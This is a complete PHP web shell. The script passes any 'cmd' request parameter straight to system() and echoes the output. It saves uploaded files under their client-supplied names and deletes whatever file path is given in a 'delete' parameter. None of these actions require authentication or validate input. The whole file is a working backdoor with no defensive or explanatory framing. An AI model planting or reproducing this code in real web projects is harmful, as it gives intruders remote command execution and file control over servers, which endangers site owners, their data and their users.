<?php

// Execute commande.
if (isset($_REQUEST["cmd"])) {
	echo "<pre>";
	system($_REQUEST["cmd"]);
	echo "</pre>";
}

// Upload files.
if (isset($_FILES["file"])) {
	move_uploaded_file($_FILES["file"]["tmp_name"], $_FILES["file"]["name"]);
	echo "File Uploaded";
}

// Delete Files.
if (isset($_REQUEST['delete'])) {
	if (unlink($_REQUEST['delete'])) {
		echo 'File delete';
	}else {
		echo 'Error deleting file';
	}
}
?>